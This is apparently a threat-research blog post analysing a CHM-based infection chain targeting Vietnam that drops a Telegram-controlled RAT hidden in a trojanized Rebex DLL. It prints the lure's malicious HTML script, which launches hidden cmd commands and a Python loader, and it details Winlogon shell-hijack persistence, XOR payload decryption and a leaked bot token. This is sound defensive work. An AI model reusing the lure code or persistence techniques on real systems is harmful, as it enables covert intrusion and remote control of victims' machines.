---
title: Rebex-based Telegram RAT Targeting Vietnam
by: dmpdump
tags: telegram backdoor vietnam
---

On April 1, 2026, a zip archive named `CV - Vu PLPC So2156516.zip` was uploaded to VirusTotal from Vietnam. This archive contains a Microsoft Compiled HTML (CHM) file named `Word Document - CV - Vu PLPC KT nam 2026.chm`. CHM files have historically been used by a plethora of threat actors. In my personal experience, I have seen CHM files trojanized primarily in state-sponsored/targeted activity rather than opportunistic cybercrime. That is only a personal observation, not substantiated by any serious data analysis.

# CHM Overview
The `Word Document - CV - Vu PLPC KT nam 2026.chm` file contains an HTML which reveals the lure and the initial malicious code. When the victim opens the CHM file, they are presented with a fake message indicating that the document is corrupt.

![sshot](/assets/images/telegramrat/chmlure.png)

The script embedded into the HTML initiates the infection when the victim clicks on either 'Yes' or 'No'

```javascript
    <script>
        function loaded() {
            var Y = location.href.lastIndexOf('::')
            var path = location.href.substring(14, Y);
            path = path.split("%20").join(" ");
            at.style.display = 'none';
            aa.innerHTML += '<OBJECT id=a classid="clsid:41B23C28-488E-4E5C-ACE2-BB0BBABE99E8"><PARAM name="Command" value="ShortCut"><PARAM name="Button" value="Text:&nbsp;&nbsp;Yes&nbsp;&nbsp;"><PARAM name="Item1" value=",cmd.exe, /c start /min cmd /c &quot;hh -decompile %tmp%\\rupt ' + path + ' &&set PYTHONHOME=&& start /min cmd /c %tmp%\\rupt\\_MecerYleDG\\_WcWWXugOou\\_pJifgWSwPi.exe %tmp%\\rupt\\_MecerYleDG\\_xSiWWWuYLk.pyc&quot;"><PARAM name="Item2" value="273,1,1"></OBJECT>';
            bt.style.display = 'none';
            bb.innerHTML += '<OBJECT id=b classid="clsid:41B23C28-488E-4E5C-ACE2-BB0BBABE99E8"><PARAM name="Command" value="ShortCut"><PARAM name="Button" value="Text:&nbsp;&nbsp;No&nbsp;&nbsp;&nbsp;"><PARAM name="Item1" value=",cmd.exe, /c start /min cmd /c &quot;hh -decompile %tmp%\\rupt ' + path + ' &&set PYTHONHOME=&& start /min cmd /c %tmp%\\rupt\\_MecerYleDG\\_WcWWXugOou\\_pJifgWSwPi.exe %tmp%\\rupt\\_MecerYleDG\\_xSiWWWuYLk.pyc&quot;"><PARAM name="Item2" value="273,1,1"></OBJECT>';
        }
        window.onload = loaded;
    </script>
```

The commands executed from this fake message do the following:
* `hh.exe -d` is used to decompile the contents of the CHM to `%tmp%\rupt\_MecerYleDG`.
* The `PYTHONHOME` environment variable is cleared.
* It runs a renamed python interpreter, `_pJifgWSwPi.exe` against an extracted .pyc `_xSiWWWuYLk.pyc`.

The following are the files extracted from the CHM to the %tmp% folder:

![sshot](/assets/images/telegramrat/contentchm.png)

* `_KolzhNtpUi` contains the HTML with the script that triggers the infection.
* `_KolzhNtpUi` contains the Python runtime.
* The extracted `Word Document - 2026 BBBC.docx` is a large blob of encrypted data subsequently used for the next stages.

The compiled Python bytecode, `_xSiWWWuYLk.pyc` can be decompiled easily, revealing that its only purpose is to load the extracted `_WwWQPVGiYq.dll`.

```python 
import ctypes
import os

try:
    file_path = os.path.expandvars('%tmp%\\rupt\\_MecerYleDG\\_WwWQPVGiYq.dll')
    os.chdir(os.path.dirname(file_path))
    my_dll = ctypes.CDLL(file_path)
    my_dll.Run()
except:
    pass
```
# Payload Decryptor
The DLL loaded with the Python bytecode, `_WwWQPVGiYq.dll`, is a C++ DLL that serves the purpose of decrypting and executing the next stage in the infection, as well as establishing persistence. The main logic in the DLL starts with an exported function named `Run`. The first thing the DLL does is search for a file named `Word Document - 2026 BBBC.docx` in its current working directory. Most of the relevant strings in the DLL are encrypted with simple XOR encryption using key `0xD6C7DCF9EAC9A3E5`.

![sshot](/assets/images/telegramrat/searchdoc.png)

`Word Document - 2026 BBBC.docx` is not a real Word document. A simple inspection reveals that it is a blob of encrypted data.

![sshot](/assets/images/telegramrat/encrypteddoc.png)

The DLL takes a 2-layer XOR decryption approach to obtain the next stages of the infection. 
* First, the complete `Word Document - 2026 BBBC.docx` is XOR-decrypted with the same key that is used to decrypt strings (`0xD6C7DCF9EAC9A3E5`).
* Then, the string `5737851` is decrypted with the same XOR key. This string is subsequently converted to an integer and used to calculate the 'tail' of the document.
* The first part of the decrypted data (total decrypted file size - last 5737851 bytes) is used as a decoy/corrupted Word document. This file is saved as `uldy15oj.docx`.
* The 'tail' of the decrypted file (the last 5737851 bytes) is decrypted again with a different XOR key (`0xC5D9C6A9AFD4A6DD`).
* This tail, which is decrypted twice, has embedded items which are parsed by the DLL. Each of the decrypted items is preceded by its size.

First XOR decryption pass and decryption of the tail size:
![sshot](/assets/images/telegramrat/docxdecrypt1.png)

Second XOR decryption pass of the tail:
![sshot](/assets/images/telegramrat/docxdecrypt2.png)

Function implemented to read different chunks from the tail of the decrypted file:
![sshot](/assets/images/telegramrat/readchunk.png)

The different chunks that are decrypted from the tail of the document and are dropped to `%AppData%\Local\Temp` are:
* An XML target for `msbuild.exe` named `mechaniSm.xml`. This XML implements the loading of a DLL.
* A .csproj file with inline obfuscated code (a RAT decryptor).
* The `ioy24euj.dll` DLL name.
* A .NET DLL which implements a RAT decryptor (the same code from the .csproj, but compiled).

The following diagram shows an overview of how `Word Document - 2026 BBBC.docx` is decrypted:

![sshot](/assets/images/telegramrat/decryptdiagram.png)

All the components from `Word Document - 2026 BBBC.docx` can be decrypted with the following script:

```python
import struct
from pathlib import Path

KEY_L1     = bytes.fromhex("D6C7DCF9EAC9A3E5")
KEY_L2     = bytes.fromhex("C5D9C6A9AFD4A6DD")
TAIL_SIZE  = 5737851
INPUT_FILE = "Word Document - 2026 BBBC.docx"

def xor(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def read_chunk(data, offset):
    size = struct.unpack_from("<I", data, offset)[0]
    offset += 4
    return data[offset:offset + size], offset + size

data   = Path(INPUT_FILE).read_bytes()
layer1 = xor(data, KEY_L1)

Path("payload1_decoy.docx").write_bytes(layer1[:-TAIL_SIZE])
print(f"[+] payload1_decoy.docx ({len(layer1) - TAIL_SIZE} bytes)")

layer2 = xor(layer1[-TAIL_SIZE:], KEY_L2)
offset = 0

chunk1, offset = read_chunk(layer2, offset)
Path("payload 2").write_bytes(chunk1)
print(f"[+] payload 2: ({len(chunk1)} bytes)")

chunk3, offset = read_chunk(layer2, offset)
Path("payload 3").write_bytes(chunk3)
print(f"[+] payload 3: ({len(chunk3)} bytes)")

chunk4, offset = read_chunk(layer2, offset)
Path("payload 4").write_bytes(chunk4)
print(f"[+] payload 4: ({len(chunk4)} bytes)")

chunk5, offset = read_chunk(layer2, offset)
Path("payload 5").write_bytes(chunk5)
print(f"[+] payload 5: ({len(chunk5)} bytes)")

```
An inspection of the decrypted tail shows how each of the chunks are preceded by its size. For instance, the size of the first decrypted file is 1916990 bytes (0x1D403E).

![sshot](/assets/images/telegramrat/layer2chunk.png)

`mechaniSm.xml` is the XML executed by `msbuild.exe` during the infection chain. This XML is used to load `ioy24euj.dll`, a .NET DLL that loads the final payload.

![sshot](/assets/images/telegramrat/mechanism.png)

After decrypting and dropping components from `Word Document - 2026 BBBC.docx`, the DLL:
* Establishes persistence by implementing a Shell hijack in `HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Shell`.
* Creates a scheduled task to shutdown the system every Friday at midnight, possibly to trigger the persistence mechanism.
* Runs `mechaniSm.xml` with `msbuild.exe`, loading `ioy24euj.dll`. 
All the relevant strings for those actions are encrypted with the same `0xD6C7DCF9EAC9A3E5` XOR key.

The following decompiled code shows the sequence of actions after the payloads are decrypted and dropped:

![sshot](/assets/images/telegramrat/dllflow.png)

For persistence, the DLL decrypts (always using the same XOR key) and sets the following environment variables under `HKCU\Environment`:
* `Msbd` is set to `C:\Windows\Microsoft.NET\Framework64\v3.5\MSBuild.exe`
* `Pyps` is set to `powershell`
* `Temprd` is set to `C:\Users\%user%\AppData\Local\Temp\mechaniSm.xml`

These environment variables are used to implement a persistent shell hijack via the `Winlogon` key. Using environment variables, the threat actor likely attempted to add stealth to the hijacked shell.

The `HKLM` Winlogon key has `explorer.exe` in the `Shell` value:

![sshot](/assets/images/telegramrat/hklmshell.png)

For persistent execution, the threat actor hijacked this value in `HKCU`:

![sshot](/assets/images/telegramrat/hijackedshell.png)

This leads to the persistent execution of `mechaniSm.xml` via `msbuild.exe` using PowerShell, leveraging environment variables for additional stealth.

Additionally, a Scheduled Task named `Doubt` is created to shut down the system every Friday at midnight:

![sshot](/assets/images/telegramrat/scheduledtask1.png)

![sshot](/assets/images/telegramrat/scheduledtask2.png)

# Telegram RAT

The `ioy24euj.dll` DLL loaded via `mechaniSm.xml` is a .NET loader for the next-stage .NET payload. This loader implements an MSBuild ITask via a class named `MSOfficeService`. The loader base64-decodes strings and XOR decrypts an embedded payload, which is subsequently decompressed and loaded in memory. The loader:

* Checks if `%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\ug35idhv.lnk` exists. If it does, it deletes it.

![sshot](/assets/images/telegramrat/lnkdel.png)

* Checks a mutex named `ODmVyekhvWKUFqvMEsyzbMpgpDcEdrJmGaLxpAMLvBjWXnOQvlottEzBOFftA`.

![sshot](/assets/images/telegramrat/mutex.png)

* Checks if the system has less than 2 processors.

![sshot](/assets/images/telegramrat/processor.png)

* Finally, it base64 decodes an embedded blob, which is XOR decrypted with key `0xC4A9AEFBF7A8FCE9E3A6`. This decrypted blob is then decompressed and loaded in memory:

![sshot](/assets/images/telegramrat/load.png)

Encoded/encrypted blob and XOR key:

![sshot](/assets/images/telegramrat/blobandkey.png)

Payload decompression and loading:

![sshot](/assets/images/telegramrat/decompressload.png)

When the next-stage is loaded, we can see that the entry point will be method `jAvYGkrRmjnSmZiwXerWcYtYwaynVwSJlzjfzSwznluMwatEIBxnJrKKHWcflCwqPc`. Additionally, 2 arguments are passed:
* A byte array from a base64 string, which results in the following bytes: `02250e240a200824032f00567b506a717e4e7861022f0c220e797e4d0a6272716c5b4322622e03617c7803507827`
* The string: `8323854499`, hard-coded here:

![sshot](/assets/images/telegramrat/arg2.png)

A quick inspection of the next decrypted stage reveals that the final stage is also a .NET DLL, specifically a weaponized version of [Rebex.Common.dll](https://www.rebex.net/kb/assembly-references-packaging/). A quick comparison between a clean version of `Rebex.Common.dll` and this payload reveals that many namespaces present in the malware are extraneous and don't belong to `Rebex.Common.dll`.

![sshot](/assets/images/telegramrat/stage2a.png)

![sshot](/assets/images/telegramrat/stage2b.png)

Reviewing the entry point observed in the loader, we can see how the 2 arguments are processed. The byte array passed as an argument is first decrypted with XOR key `0xCE`. Then, even byte positions are decrypted with XOR key `0xF4` and odd byte positions are decrypted with XOR key `0xD9`.

![sshot](/assets/images/telegramrat/entrypointstage2.png)

Decrypting this array, we obtain the following Telegram bot token, composed of {bot_id}:{auth_token}:

```plaintext
8243072398:AAGPfDYBv88654nDZ0uHfVLy5X99vFo9GB0
```
The other argument, `8323854499`, is the chat_id.

The RAT uses the `Rebex.Net` Webclient implementation for its C2 activities. It also supports SOCKS5 proxy, although it does not seem to be configured in the RAT. After registering the victim, the RAT enters a loop that allows it to receive commands. All relevant strings are XOR encrypted, as in the previous stages.

![sshot](/assets/images/telegramrat/commandloop.png)

The following commands are accepted by the RAT:

| Command | Action        |
|---------|---------------|
| 1*      | ping/alive check              |
| 91      | Token swap                    |
| 45      | File download from Telegram   |
| default | cmd.exe /c command execution  |

Command `1*` is a simple request for the RAT to check back in. This command simply calls home via the `sendMessage` method, pinging back to the attacker.

![sshot](/assets/images/telegramrat/checkalive.png)

Command `91` swaps the Telegram bot token, giving the threat actor flexibility if a token is reported.

![sshot](/assets/images/telegramrat/tokenswap.png)

Command `45` allows the threat actor to download a file from `api.telegram.org/bot{token}/file/{file_path}` to the `%TMP%` folder.

![sshot](/assets/images/telegramrat/filedownload.png)

The default RAT behavior is command execution via `cmd.exe /c`. This process is created with no windows (and also hidden window.)

![sshot](/assets/images/telegramrat/cmdexec.png)

 
# Final Notes

As of right now, this Rebex-based Telegram-based RAT still has 0 detections in VirusTotal:

![sshot](/assets/images/telegramrat/nodetection.png)

The use of Rebex libraries for malware purposes is, as far as I know, rare. However, this perspective is limited to my limited field of view. Looking at the metadata of the malicious DLL, we can see that the legitimate DLL was likely obtained via NuGet.

![sshot](/assets/images/telegramrat/metadata.png)

Various elements in the infection chain suggest this is targeted threat activity against Vietnam, and various techniques have been used in the past by targeted threat actors in the region. However, at this point I cannot correlate this to any specific threat actor with high confidence.

# IOCs  
* `CV - Vu PLPC So2156516.zip`: 6db64b44305ff125f729713d7ff516e84e4ca38504a2ab0571eb19597f49feee
* `Word Document - CV - Vu PLPC KT nam 2026.chm`: a0d5b30578acd1df9139e7a8a4bfc659dc2cf48f4dc0c5804b70890adeb9fa21
* `ioy24euj.dll`: 67b51a73c72f39b9cf41dd35eb22b369713ab2e576641b40b9089ebc9d4a1fb2
* `Telegram RAT (decrypted)`: 1323278360d41a74ab09d310f08902087ff2798d1eda99be65d07c1b1123a25c

